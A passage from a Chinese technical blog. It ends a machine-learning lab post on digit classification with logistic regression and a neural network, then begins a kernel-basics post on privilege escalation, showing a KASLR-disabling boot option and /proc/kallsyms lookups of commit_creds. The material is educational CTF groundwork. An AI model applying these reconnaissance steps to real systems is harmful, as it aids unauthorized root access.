class="built_in">range</span>(rows):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">			<span class="keyword">if</span> current_image &gt; m:</span><br><span class="line">				<span class="keyword">break</span> </span><br><span class="line">			max_val = np.<span class="built_in">max</span>(np.<span class="built_in">abs</span>(x[current_image,:]))</span><br><span class="line">			display_array[pad + j*(height + pad) + np.arange(height),pad + i*(width + pad) + np.arange(width)[:,np.newaxis]] = x[current_image,:].reshape((height,width)) / max_val</span><br><span class="line">			current_image += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> current_image &gt; m :</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 显示图像</span></span><br><span class="line">	plt.figure()</span><br><span class="line">	<span class="comment"># 设置图像色彩为灰度值，指定图像坐标范围</span></span><br><span class="line">	plt.imshow(display_array,cmap = <span class="string">&#x27;gray&#x27;</span>,extent =[-<span class="number">1</span>,<span class="number">1</span>,-<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">	plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">	plt.title(<span class="string">&#x27;Random Seleted Digits&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>把输入的图像数据X进行重新排列，显示在一个面板 figurePane 中</li>
<li>面板中有多个小 imge 用来显示每一行数据</li>
</ul>
<p>第一部分的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.io <span class="keyword">as</span> scio</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 1.读取数据和初始化 ======</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data\ex3data1.mat&#x27;</span>) <span class="comment"># 使用scipy.io中的函数读取mat文件,data的格式是字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据关键字,分别获得输入数据和输出的真值</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(X.shape) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机取出其中的100个样本,显示结果</span></span><br><span class="line">m = X.shape[<span class="number">0</span>] <span class="comment"># m:矩阵长度</span></span><br><span class="line">rand_indices = np.random.permutation(<span class="built_in">range</span>(m)) <span class="comment"># 把[0,m-1]的数据随机排序</span></span><br><span class="line">selected = X[rand_indices[<span class="number">0</span>:<span class="number">100</span>],:] <span class="comment"># 排序后取前100个样本</span></span><br><span class="line">display_data(selected) <span class="comment"># 显示手写数字样例</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<ul>
<li>shape：读取矩阵的长度</li>
<li>permutation(X)：随机排列一个序列，或者数组</li>
</ul>
<p>绘制的图像：</p>
<img src="/2022/05/10/Machine-Learning-Lab3/1652000705797-1652194862841.png" class width="1652000705797"> 
<h2 id="Vectorizing-Logistic-Regression（向量化逻辑回归）"><a href="#Vectorizing-Logistic-Regression（向量化逻辑回归）" class="headerlink" title="Vectorizing Logistic Regression（向量化逻辑回归）"></a>Vectorizing Logistic Regression（向量化逻辑回归）</h2><p>现在我们要根据数据集来训练一个模型，使机器可以识别出这些“手写数字”对应的“真正数字”，这很明显是一个分类问题，并且还是多元分类，每个样本都有 10 种可能性（“0”~“9”）</p>
<p>您将使用多个 one-vs-all 逻辑回归模型来构建多类分类器：</p>
<ul>
<li>因为有10个类，你需要训练10个独立的逻辑回归分类器</li>
<li>为了提高培训的效率，确保代码具有良好的矢量化非常重要</li>
<li>在本节中，您将实现逻辑回归的向量化版本（该版本不使用任何 for 循环）</li>
</ul>
<p>其实在之前的实验中我们已经在使用向量化了（利用矩阵乘法来代替循环），这里实验要求使用</p>
<p>首先，我们先回忆一下逻辑回归-代价函数（交叉熵）的矢量版本：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]</script><p>因为需要求和，所以矢量版本的代码肯定有循环，但是向量版本却可以用“矩阵乘法”来替代循环：</p>
<p>代价函数 lr_cost_function：（带有正则化）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lr_cost_function</span>(<span class="params">X,Y,theta,lmd</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	g = sigmoid(X.dot(theta))</span><br><span class="line">	Y = Y.reshape(Y.size)</span><br><span class="line"></span><br><span class="line">	cost = (-Y.T).dot(np.log(g)) - ((<span class="number">1</span>-Y).T).dot(np.log(<span class="number">1</span>-g))</span><br><span class="line">	cost = cost /(m) + lmd * (theta.T).dot(theta) / (<span class="number">2</span>*m)</span><br><span class="line">	</span><br><span class="line">	grad = (X.T).dot(g-Y)/ m</span><br><span class="line">	grad[<span class="number">0</span>] = grad[<span class="number">0</span>]</span><br><span class="line">	grad[<span class="number">1</span>:] = grad[<span class="number">1</span>:] + (lmd * theta[<span class="number">1</span>:])/m</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：和前面 ex2 的 costfunction 相同（因为前面的实验都使用了向量化）</li>
</ul>
<p>实现主体：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====== 2.向量化Logistic Rgression ======</span></span><br><span class="line"></span><br><span class="line">theta_t = np.array([-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">X_t = np.c_[np.ones(<span class="number">5</span>), np.arange(<span class="number">1</span>, <span class="number">16</span>).reshape((<span class="number">3</span>, <span class="number">5</span>)).T/<span class="number">10</span>]</span><br><span class="line">y_t = np.array([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">lmda_t = <span class="number">3</span></span><br><span class="line">cost,grad = lr_cost_function(X_t,y_t,theta_t,lmda_t)</span><br><span class="line">np.set_printoptions(formatter=&#123;<span class="string">&#x27;float&#x27;</span>: <span class="string">&#x27;&#123;: 0.6f&#125;&#x27;</span>.<span class="built_in">format</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost: &#123;:0.7f&#125;&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected cost: 3.734819&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gradients:\n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected gradients:\n[ 0.146561 -0.548558 0.724722 1.398003]&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>set_printoptions：控制Python中小数的显示精度</li>
</ul>
<h2 id="One-vs-all-Classification（一对多分类）"><a href="#One-vs-all-Classification（一对多分类）" class="headerlink" title="One-vs-all Classification（一对多分类）"></a>One-vs-all Classification（一对多分类）</h2><p>接下来就要实现多元分类的逻辑回归：</p>
<p>在这部分练习中，您将通过训练多个正则化逻辑回归分类器来实现一对所有分类，每个分类器对应于数据集中的K个类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====== 3.训练模型 ======</span></span><br><span class="line"></span><br><span class="line">lmd = <span class="number">0.01</span></span><br><span class="line">num_labels = <span class="number">10</span> <span class="comment"># 每个样本有10种可能</span></span><br><span class="line">all_theta = one_vs_all(X,Y,num_labels,lmd) <span class="comment"># 模型拟合</span></span><br><span class="line">pred = predict_one_vs_all(X,all_theta) <span class="comment"># 预测手写数字</span></span><br><span class="line">Y = Y.reshape(Y.size) <span class="comment"># 这里一定要把Y.shape变成横向量(之前是竖向量)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training set accurayc:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(pred == Y)*<span class="number">100</span>)) <span class="comment"># 计算精度</span></span><br></pre></td></tr></table></figure>
<p>模型拟合的具体过程在 one_vs_all 函数中，看看该函数的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scipy.optimize <span class="keyword">as</span> opt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"><span class="keyword">from</span> lrCostFunction <span class="keyword">import</span> lr_cost_function</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_vs_all</span>(<span class="params">X,Y,num_labels,lmd</span>):</span></span><br><span class="line">	X = np.c_[np.ones(X.shape[<span class="number">0</span>]),X] <span class="comment"># 给数据添加偏置维度</span></span><br><span class="line">	n = X.shape[<span class="number">1</span>]</span><br><span class="line">	all_theta = np.zeros((num_labels,n)) <span class="comment"># 保存所有theta的集合</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num_labels+<span class="number">1</span>):</span><br><span class="line">		init_theta = np.zeros((n,<span class="number">1</span>));</span><br><span class="line">		y = (Y == i).astype(<span class="built_in">int</span>) <span class="comment"># Y中的值是1~10(代表可能的分类,注意:&quot;10&quot;代表了&quot;0&quot;)</span></span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">t</span>):</span></span><br><span class="line">			<span class="keyword">return</span> lr_cost_function(X,y,t,lmd)[<span class="number">0</span>]</span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">t</span>):</span></span><br><span class="line">			<span class="keyword">return</span> lr_cost_function(X,y,t,lmd)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">		theta, cost, *unused = opt.fmin_bfgs(f=cost_func, fprime=grad_func, x0=init_theta, maxiter=<span class="number">100</span>, full_output=<span class="literal">True</span>, disp=<span class="literal">False</span>) <span class="comment"># 使用fminunc进行拟合</span></span><br><span class="line">		all_theta[i-<span class="number">1</span>,:] = theta.T <span class="comment"># 保存theta</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> all_theta</span><br></pre></td></tr></table></figure>
<p>最后看一下预测函数 predict_one_vs_all 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_one_vs_all</span>(<span class="params">X,all_theta</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	X = np.c_[np.ones(m),X]</span><br><span class="line">	num_labels = all_theta.shape[<span class="number">0</span>] <span class="comment"># 标签数10</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># preds[m][k]是第m个样本属于k的概率</span></span><br><span class="line">	preds = sigmoid(X.dot(all_theta.T))</span><br><span class="line">	P = np.zeros(m)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">		<span class="comment"># 找到第num行中,与该行最大值相等的列的下标,此时下标的范围是[0,9]</span></span><br><span class="line">		<span class="comment"># label的范围是[1,10],需要把下标的值+1</span></span><br><span class="line">		<span class="comment"># np.where()返回的是一个长度为2的元祖,保存的是满足条件的下标</span></span><br><span class="line">		<span class="comment"># 元组中第一个元素保存的是行下标,第二元素保存的是列下标</span></span><br><span class="line">		index = np.where(preds[num,:] == np.<span class="built_in">max</span>(preds[num,:]))</span><br><span class="line">		P[num] = index[<span class="number">0</span>][<span class="number">0</span>].astype(<span class="built_in">int</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> P</span><br></pre></td></tr></table></figure>
<h2 id="Neural-Networks（神经网络）"><a href="#Neural-Networks（神经网络）" class="headerlink" title="Neural Networks（神经网络）"></a>Neural Networks（神经网络）</h2><p>在本练习的前一部分中，您实现了多类逻辑回归来识别手写数字，然而，逻辑回归不能形成更复杂的假设，因为它只是一个线性分类器</p>
<p>在这部分练习中，您将使用与之前相同的训练集实现一个神经网络来识别手写数字，神经网络将能够表示形成非线性假设的复杂模型：</p>
<ul>
<li>本次实验，你们将使用我们已经训练过的神经网络的参数</li>
<li>您的目标是实现正向传播算法，使用我们的权重进行预测（已经训练好了）</li>
<li>在下次的实验中，您将编写学习神经网络参数的反向传播算法</li>
</ul>
<p>神经网络简图：（具体细节就不解释了）</p>
<img src="/2022/05/10/Machine-Learning-Lab3/1652027285928-1652194862841.png" class width="1652027285928"> 
<h2 id="Model-representation（模型表示）"><a href="#Model-representation（模型表示）" class="headerlink" title="Model representation（模型表示）"></a>Model representation（模型表示）</h2><p>对于本实验的神经网络架构：</p>
<img src="/2022/05/10/Machine-Learning-Lab3/1652192237719-1652194862841.png" class width="1652192237719">  
<p>这个神经网络有三层：输入层，隐藏层，输出层</p>
<ul>
<li>我们的输入是数字图像的像素值，由于图像的大小为20×20，这给了我们400个输入层单元（不包括总是输出+1的额外偏置单元）</li>
<li>与之前一样，训练数据将加载到变量X和y中，我们已经向您提供了一组参数（θ(1),θ(2)），这些参数已经由我们训练过</li>
<li>这些都存储在 ex3weights.mat ，并将由 ex3_nn 加载到θ1和θ2，参数的尺寸为神经网络的尺寸，第二层为25个单元，输出为10个单元（对应于10个数字类）</li>
</ul>
<h2 id="Feedforward-Propagation-and-Prediction（正向传播与预测）"><a href="#Feedforward-Propagation-and-Prediction（正向传播与预测）" class="headerlink" title="Feedforward Propagation and Prediction（正向传播与预测）"></a>Feedforward Propagation and Prediction（正向传播与预测）</h2><p>现在，您将为神经网络实现正向传播，您需要在 predict 中完成代码，返回神经网络的预测</p>
<p>你应该实现正向传播算法，为每个示例 i 计算 hθ(x(i)) 并返回相关预测（类似于“一对多”分类策略）</p>
<p>下面是实现过程：</p>
<ul>
<li>1.读取数据，显示随机样例（和上半部分一样）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========================= 1.读取数据,显示随机样例 ===========================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data\ex3data1.mat&#x27;</span>)</span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten() <span class="comment"># 返回一个一维数组</span></span><br><span class="line">m = X.shape[<span class="number">0</span>] <span class="comment"># m:矩阵长度</span></span><br><span class="line">rand_indices = np.random.permutation(<span class="built_in">range</span>(m))</span><br><span class="line">selected = X[rand_indices[<span class="number">1</span>:<span class="number">100</span>],:] <span class="comment"># 随机取出其中的100个样本</span></span><br><span class="line">display_data(selected) <span class="comment"># 显示手写数字样例</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<img src="/2022/05/10/Machine-Learning-Lab3/1652192993640-1652194862841.png" class width="1652192993640"> 
<ul>
<li>2.读取神经网络的参数（）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================= 2.读取神经网络的参数 =================================</span></span><br><span class="line">weight = scio.loadmat(<span class="string">&#x27;data\ex3weights.mat&#x27;</span>)</span><br><span class="line"><span class="comment"># 隐藏层有25个节点,输入数据为401维(添加了1个维度的偏置)</span></span><br><span class="line"><span class="comment"># 输出层有10个节点,隐藏层添加一个维度后,有25个输出</span></span><br><span class="line">theta1 = weight[<span class="string">&#x27;Theta1&#x27;</span>]</span><br><span class="line">theta2 = weight[<span class="string">&#x27;Theta2&#x27;</span>]</span><br><span class="line"></span><br><span class="line">P = predict_nn(X,theta1,theta2) <span class="comment"># 预测神经网络</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training set accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(P == Y)*<span class="number">100</span>)) <span class="comment"># 计算该模型的准确度</span></span><br></pre></td></tr></table></figure>
<ul>
<li>3.随机选取样本，并显示预测结果</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================= 3.随机选取样本,并显示预测结果 =========================</span></span><br><span class="line">rp = np.random.permutation(<span class="built_in">range</span>(m)) <span class="comment"># 随机排列一个序列,或者数组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Displaying Example image&#x27;</span>)</span><br><span class="line">    example = X[rp[i]]</span><br><span class="line">    example = example.reshape((<span class="number">1</span>, example.size)) <span class="comment"># 调节example为1x1(只有一个方框)</span></span><br><span class="line">    display_data(example) <span class="comment"># 显示手写数字样例</span></span><br><span class="line">    plt.show()</span><br><span class="line">    </span><br><span class="line">    pred = predict_nn( example,theta1, theta2) <span class="comment"># 预测手写数字</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Neural network prediction: &#123;&#125; (digit &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(pred, np.mod(pred, <span class="number">10</span>)))</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&#x27;Paused - press ENTER to continue, q + ENTER to exit: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<ul>
<li>预测函数 predict_nn 的实现：（有点不理解它为什么要这么组织代码）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据输入的数据和参数，计算神经网络的输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_nn</span>(<span class="params">X,theta1,theta2</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	X= np.c_[np.ones(m),X]</span><br><span class="line">	z1 = theta1.dot(X.T) <span class="comment"># 隐藏层的输入</span></span><br><span class="line">	z1 = np.row_stack((np.ones(z1.shape[<span class="number">1</span>]),z1)) <span class="comment"># 增加一行维度</span></span><br><span class="line">	A1 = sigmoid(z1) <span class="comment"># 隐藏层的输出</span></span><br><span class="line">	z2 = theta2.dot(A1) <span class="comment"># 输出层的输入</span></span><br><span class="line">	A2 = sigmoid(z2.T) <span class="comment"># 输出层的输出</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 进行预测</span></span><br><span class="line">	P = np.zeros(m)</span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">		<span class="comment"># 找到第num行中,与该行最大值相等的列的下标,此时下标的范围是[0,9]</span></span><br><span class="line">		<span class="comment"># label的范围是[1,10],需要把下标的值+1</span></span><br><span class="line">		<span class="comment"># np.where()返回的是一个长度为2的元祖,保存的是满足条件的下标</span></span><br><span class="line">		<span class="comment"># 元组中第一个元素保存的是行下标,第二元素保存的是列下标</span></span><br><span class="line">		index = np.where(A2[num,:] == np.<span class="built_in">max</span>(A2[num,:]))</span><br><span class="line">		P[num] = index[<span class="number">0</span>][<span class="number">0</span>].astype(<span class="built_in">int</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> P</span><br></pre></td></tr></table></figure>
<ul>
<li>where(condition)：满足条件(condition)，输出满足条件元素的坐标 </li>
<li>max(array)：返回 array 的最大值</li>
</ul>
<p>显示图片：</p>
<img src="/2022/05/10/Machine-Learning-Lab3/1652193393126-1652194862841.png" class width="1652193393126"> 
<p>预期结果：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Neural network prediction: [<span class="number">4.</span>] (digit [<span class="number">4.</span>])</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/09/Kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/09/Kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">Kernel基础知识（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-09 23:12:58" itemprop="dateCreated datePublished" datetime="2022-05-09T23:12:58+08:00">2022-05-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-02 21:52:34" itemprop="dateModified" datetime="2022-10-02T21:52:34+08:00">2022-10-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="POSIX-简析"><a href="#POSIX-简析" class="headerlink" title="POSIX 简析"></a>POSIX 简析</h2><p>POSIX：可移植操作系统接口（ Portable Operating System Interface，缩写为 POSIX ）</p>
<p>POSIX是一套标准，为了提高Unix的 <strong>兼容性</strong> 和 <strong>应用程序可移植性</strong> 而诞生，这套标准涵盖了很多方面，比如：Unix系统调用的C语言接口，shell程序和工具，线程及网络编程 </p>
<ul>
<li>POSIX兼容也就指定了接口函数兼容，但是并不管API具体如何实现</li>
</ul>
<h2 id="Kernel-简析"><a href="#Kernel-简析" class="headerlink" title="Kernel 简析"></a>Kernel 简析</h2><p>Kernel 是一个程序，是操作系统底层用来管理上层软件发出的各种请求的程序，Kernel 将各种请求转换为指令，交给硬件去处理，简而言之，Kernel 是连接软件与硬件的中间层 </p>
<p>Kernel 主要提供两个功能，与硬件交互，提供应用运行环境</p>
<p>在 intel 的 CPU 中，会将 CPU 的权限分为 Ring 0，Ring 1，Ring 2，Ring 3，四个等级，权限依次递减，高权限等级可以调用低权限等级的资源</p>
<p>在常见的系统（Windows，Linux，MacOS）中，内核处于 Ring 0 级别，应用程序处于 Ring 3 级别</p>
<h2 id="Kernel-信息获取"><a href="#Kernel-信息获取" class="headerlink" title="Kernel 信息获取"></a>Kernel 信息获取</h2><p>先关闭 kaslr：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span><br></pre></td></tr></table></figure>
<p>在 root 权限下启动 kernel：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># lsmod </span></span><br><span class="line">d3kheap <span class="number">16384</span> <span class="number">2</span> - Live <span class="number">0xffffffffc0133000</span> (OE)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># grep anon_pipe_buf_ops /proc/kallsyms</span></span><br><span class="line">ffffffff88c3fe40 r anon_pipe_buf_ops</span><br><span class="line">/ <span class="meta"># grep commit_creds /proc/kallsyms</span></span><br><span class="line">ffffffff87cd25c0 T commit_creds</span><br></pre></td></tr></table></figure>
<h2 id="Kernel-提权"><a href="#Kernel-提权" class="headerlink" title="Kernel 提权"></a>Kernel 提权</h2><p>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源，这里从两种角度来考虑如何提权</p>
<ul>
<li>改变自身：通过改变自身进程的权限，使其具有 root 权限</li>
<li>改变别人：通过影响高权限进程的执行，使其完成我们想要的功能</li>
</ul>
<p><strong>Change Self：</strong></p>
<p>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    